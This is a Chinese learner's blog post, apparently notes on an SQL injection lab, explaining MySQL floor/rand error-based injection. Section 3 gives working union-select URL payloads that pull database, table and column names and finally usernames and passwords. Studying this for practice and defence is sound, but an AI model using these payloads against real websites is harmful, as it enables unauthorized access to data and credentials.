@@ -1,0 +1,115 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#6 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#6</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-06T08:05:17.000Z" id="date"> 2023-06-06</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-07T07:23:50.393Z" id="updated"> 2023-06-07</time></div></span></div></div><hr><div id="post-content"><p>这篇文章学习floor报错</p>
+<span id="more"></span>
+
+<p>这个报错似乎涉及的函数还不少，</p>
+<p>up花了两节课讲</p>
+<h1 id="1-Basic"><a href="#1-Basic" class="headerlink" title="1 Basic"></a>1 Basic</h1><ol>
+<li><p>rand()函数</p>
+<p>这个函数的用处是生成一个0-1的随机小数</p>
+<p>rand(n) 不返回随机数，返回一个固定的数</p>
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select rand();<br>select rand()*2;   -- 支持加减乘除<br>select rand() from 表名;   -- 表中有几行返回几行随机数<br>例如：<br>mysql&gt; select rand()*2;<br>+--------------------+<br>| rand()*2           |<br>+--------------------+<br>| 0.9653487289001688 |<br>+--------------------+<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>floor()函数</p>
+<p>就是向下取整，相当于去尾</p>
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">floor(需要去尾的数)<br>例如：<br>mysql&gt; select floor(1.114514);<br>+-----------------+<br>| floor(1.114514) |<br>+-----------------+<br>|               1 |<br>+-----------------+<br></code></pre></td></tr></table></figure>
+
+<p>可以配合上前面的rand函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; select floor(rand());<br>+---------------+<br>| floor(rand()) |<br>+---------------+<br>|             0 |<br>+---------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>concat_ws() 函数</p>
+<p>将函数内字段用第一个参数连接起来</p>
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; select concat_ws(&#x27;-&#x27;,114,514);<br><br>+------------------------+<br>| concat_ws(&#x27;-&#x27;,114,514) |<br>+------------------------+<br>| 114-514                |<br>+------------------------+<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>as 关键字、group by 分组</p>
+<p>as相当于把一个结果放到一个变量里面，然后用group by分组</p>
+<p>和前面的函数混合在一起可以这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; select concat_ws(0x7e,database(),floor(rand())) as var from users group by var;<br>+------------+<br>| var        |<br>+------------+<br>| security~0 |<br>+------------+<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>count() 函数</p>
+<p>用于统计某个列的行数，</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select count(列名) from 表名;<br></code></pre></td></tr></table></figure>
+
+<p>如何列名填*，则将返回表中所有行的数量，</p>
+<p>如果指定一个特定的列名，</p>
+<p>则仅计算该列中具有非空值的行的数量</p>
+</li>
+</ol>
+<h1 id="2-造成报错"><a href="#2-造成报错" class="headerlink" title="2 造成报错"></a>2 造成报错</h1><p>构造如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select count(*),concat_ws(&#x27;-&#x27;,database(),floor(rand(0)*2)) as var from users group by var;<br></code></pre></td></tr></table></figure>
+
+<p>将可以造成报错，</p>
+<p>如果是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select count(*),concat_ws(&#x27;-&#x27;,database(),floor(rand(1)*2)) as var from users group by var;<br></code></pre></td></tr></table></figure>
+
+<p>则不会造成报错</p>
+<p>   这是为什么？up在视频里讲的很清楚了</p>
+
+
+<p>这里注意，这是标准的语句一个字不能差，</p>
+<p>例如floor函数和rand(0)*<strong>2</strong></p>
+<h1 id="3-开始注入"><a href="#3-开始注入" class="headerlink" title="3 开始注入"></a>3 开始注入</h1><p>首先获取数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; union select 1,count(*),concat_ws(0x7e,(database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+<br></code></pre></td></tr></table></figure>
+
+<p>获取后查询数据库中的表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; union select 1,count(*),concat_ws(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),floor(rand(0)*2)) as x from information_schema.tables group by x --+<br></code></pre></td></tr></table></figure>
+
+<p>然后获取表中的列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,count(*),concat_ws(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),floor(rand(0)*2)) as x from information_schema.tables group by x --+<br></code></pre></td></tr></table></figure>
+
+<p>然后就是最后一步获取数据了,</p>
+<p>这里使用group_concat可能会没有回显，</p>
+<p>up的ppt里面也说了，</p>
+<p>改成concat即可，但是要配上limit函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,count(*),concat_ws(0x7e,(select concat(id,&#x27;-&#x27;,username,&#x27;:&#x27;,password) from users limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x --+<br></code></pre></td></tr></table></figure>
+
+<p>注意这里limit只能返回一行</p>
+<p>然后就成功了！</p>
+<h1 id="4-最后"><a href="#4-最后" class="headerlink" title="4 最后"></a>4 最后</h1><p>今天的floor报错注入很明显构造的语句长了👍</p>
+<p>（期待一下明天和后天的时间盲注和布尔盲注</p>
+<p>（看好多人用这两个注入</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/06/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-7/">← Next Sql注入学习笔记#7</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/05/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5/">Sql注入学习笔记#5 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Basic"><span class="toc-number">1.</span> <span class="toc-text">1 Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E9%80%A0%E6%88%90%E6%8A%A5%E9%94%99"><span class="toc-number">2.</span> <span class="toc-text">2 造成报错</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">3 开始注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%9C%80%E5%90%8E"><span class="toc-number">4.</span> <span class="toc-text">4 最后</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
